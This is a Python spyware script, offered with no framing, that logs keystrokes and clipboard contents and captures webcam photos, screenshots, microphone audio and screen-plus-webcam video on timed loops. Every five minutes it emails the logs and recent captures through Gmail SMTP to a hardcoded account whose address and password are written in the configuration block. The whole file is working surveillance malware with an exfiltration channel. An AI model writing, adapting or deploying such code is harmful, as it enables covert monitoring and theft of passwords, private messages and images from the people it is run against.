from pynput import keyboard
import logging
import time
import pyperclip
import threading
import cv2
import pyautogui
import os
import smtplib
import ssl
from email.message import EmailMessage
import platform
import getpass
import uuid
import sounddevice as sd
from scipy.io.wavfile import write
import numpy as np

# === CONFIG ===
EMAIL_ADDRESS = "ayaanfahad33@gmail.com"
EMAIL_PASSWORD = "ayaan"  # Use Gmail App Password
SEND_INTERVAL = 300        # Email every 5 minutes
CAM_INTERVAL = 30          # Webcam photo interval
SS_INTERVAL = 30           # Screenshot interval
VOICE_INTERVAL = 180       # Voice record every 3 min
VOICE_DURATION = 10        # Record voice for 10 seconds
VIDEO_INTERVAL = 300       # Every 5 minutes
VIDEO_DURATION = 15        # Record screen+webcam for 15 seconds

device_id = str(uuid.getnode())
log_file = "key_log.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# === KEYLOGGER ===
def on_press(key):
    try:
        logging.info(f"Key: {key.char}")
    except AttributeError:
        logging.info(f"Key: {key}")

# === CLIPBOARD LOGGER ===
def clipboard_logger():
    old = ""
    while True:
        try:
            new = pyperclip.paste()
            if new != old:
                old = new
                logging.info(f"[CLIPBOARD] {new}")
        except:
            pass
        time.sleep(5)

# === WEBCAM ===
def take_webcam():
    try:
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            name = f"webcam_{int(time.time())}.png"
            cv2.imwrite(name, frame)
        cam.release()
    except:
        pass

def webcam_loop():
    while True:
        take_webcam()
        time.sleep(CAM_INTERVAL)

# === SCREENSHOT ===
def take_screenshot():
    try:
        ss = pyautogui.screenshot()
        name = f"screenshot_{int(time.time())}.png"
        ss.save(name)
    except:
        pass

def screenshot_loop():
    while True:
        take_screenshot()
        time.sleep(SS_INTERVAL)

# === VOICE RECORDER ===
def record_audio(duration=VOICE_DURATION, filename=None):
    fs = 44100
    if not filename:
        filename = f"voice_{int(time.time())}.wav"
    try:
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
        sd.wait()
        write(filename, fs, recording)
    except Exception as e:
        print(f"Audio error: {e}")

def voice_loop():
    while True:
        record_audio()
        time.sleep(VOICE_INTERVAL)

# === SCREEN + WEBCAM VIDEO RECORDER ===
def record_video(duration=VIDEO_DURATION, fps=10):
    screen_width, screen_height = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    filename = f"video_{int(time.time())}.avi"
    out = cv2.VideoWriter(filename, fourcc, fps, (screen_width, screen_height))

    cam = cv2.VideoCapture(0)
    if not cam.isOpened():
        cam = None

    start_time = time.time()
    while True:
        screen = pyautogui.screenshot()
        frame = np.array(screen)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)

        if cam:
            ret, webcam_frame = cam.read()
            if ret:
                webcam_frame = cv2.resize(webcam_frame, (160, 120))
                frame[10:130, 10:170] = webcam_frame

        out.write(frame)

        if time.time() - start_time > duration:
            break

    out.release()
    if cam:
        cam.release()

def video_loop():
    while True:
        record_video()
        time.sleep(VIDEO_INTERVAL)

# === EMAIL SENDER ===
def send_email():
    try:
        msg = EmailMessage()
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Spyware Logs"
        msg.set_content("Logs, screenshots, and audio attached.")

        if os.path.exists(log_file):
            with open(log_file, "rb") as f:
                msg.add_attachment(f.read(), maintype="text", subtype="plain", filename="key_log.txt")

        for ftype in ["webcam_", "screenshot_", "voice_", "video_"]:
            files = sorted([f for f in os.listdir() if f.startswith(ftype)], reverse=True)[:2]
            for file in files:
                try:
                    with open(file, "rb") as f:
                        if file.endswith(".png"):
                            msg.add_attachment(f.read(), maintype="image", subtype="png", filename=file)
                        elif file.endswith(".wav"):
                            msg.add_attachment(f.read(), maintype="audio", subtype="wav", filename=file)
                        elif file.endswith(".avi"):
                            msg.add_attachment(f.read(), maintype="video", subtype="avi", filename=file)
                except:
                    continue

        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)
    except Exception as e:
        print(f"Email error: {e}")

def email_loop():
    while True:
        send_email()
        time.sleep(SEND_INTERVAL)

# === RUN EVERYTHING ===
if __name__ == "__main__":
    threading.Thread(target=clipboard_logger, daemon=True).start()
    threading.Thread(target=webcam_loop, daemon=True).start()
    threading.Thread(target=screenshot_loop, daemon=True).start()
    threading.Thread(target=email_loop, daemon=True).start()
    threading.Thread(target=voice_loop, daemon=True).start()
    threading.Thread(target=video_loop, daemon=True).start()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
